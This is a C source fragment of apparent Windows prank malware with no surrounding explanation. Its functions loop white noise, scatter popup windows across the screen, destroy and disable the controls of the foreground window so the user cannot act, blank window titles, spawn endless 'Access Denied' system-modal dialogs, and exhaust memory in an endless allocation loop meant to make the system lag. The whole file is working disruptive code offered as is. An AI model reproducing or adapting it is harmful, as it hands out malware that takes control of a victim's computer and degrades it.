
DWORD WINAPI CallWhiteNoise() {
	PlaySound("whitenoise", GetModuleHandle(NULL), SND_RESOURCE | SND_LOOP | SND_ASYNC);
	for(;;) {/*e*/}
}


BOOL CALLBACK EnumProcMv(HWND hwnd,LPARAM lParam)
{
	// Move windows. Moving message boxes, Start menu, context menus and popups.
	scrx = GetSystemMetrics(SM_CXSCREEN);
	scry = GetSystemMetrics(SM_CYSCREEN);
	RECT rekt;
	int x, y, w, h;
	if (GetWindowLongPtr(hwnd,GWL_STYLE) & WS_POPUP)
	{
		GetWindowRect(hwnd, &rekt);
		w = rekt.right-rekt.left;
		h = rekt.bottom-rekt.top;
		x = rand()%scrx;
		y = rand()%scry;
		SetWindowPos(hwnd, 0, x, y, w, h, SWP_NOACTIVATE);
	}
	return TRUE;
}
DWORD WINAPI MoveWind() {
	while (1)
	{
		EnumWindows(EnumProcMv, 0);
		Sleep(1000);
	}
}

BOOL CALLBACK EnumProcFast(HWND hwnd,LPARAM lParam)
{
	// Block everything function. Gonna be called after enumerating windows.
	if (hwnd != 0)
	{
		SendMessageW(hwnd, WM_CHILDACTIVATE, 0, (LPARAM)FALSE);
		EnableWindow(hwnd, FALSE);
		DestroyWindow(hwnd); 
	}
	return TRUE;
}


BOOL CALLBACK EnumProcSlow(HWND hwnd,LPARAM lParam)
{
	// Function that renames everything in windows. Nothing much here
	LPCWSTR LolWideName = L"";
	SetWindowTextW(hwnd, LolWideName);
	SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)LolWideName);
	return TRUE;
}


DWORD WINAPI BlockInputFunc() {
	// enumerate windows and call func to block everything in windows without a wait. N0 n33d t0 0p3n t4skmgr!
	while (1)
	{
		EnumChildWindows(GetForegroundWindow(), EnumProcFast, 0);
	}
}


DWORD WINAPI RenameTextsFunc() {
	// Enumerates the windows and calls function to rename it. Added some sleep because it might be crashing.
	while (1)
	{
		EnumChildWindows(GetForegroundWindow(), EnumProcSlow, 0);
		Sleep(15);
	}
}


DWORD WINAPI CallWinDlgEvent() {
	// actually function with messagebox.
	MessageBoxW(0, L"Access Denied", L"Error", MB_ICONERROR| MB_OK | MB_SYSTEMMODAL);
}


DWORD WINAPI CallMoreDlgs() {
	// this is a function to call so many copies of message boxes. Made this because only like that you can remove waiting response from Message boxes.
	for(int i=0;i<5;i++) {
		CreateThread(0, 0, CallWinDlgEvent, 0, 0, 0);
	}
	while(1){
		CreateThread(0, 0, CallWinDlgEvent, 0, 0, 0);
		Sleep(500);
	}
}

DWORD WINAPI RektOutOfMem() {
	// i think that needs some explanation.
	// this is code that slowly claims all existing resources in system so the system
	// will lag so badly.
	int p;
	for(;;){
		p=p+(int)malloc((size_t)1024*4);
	}
}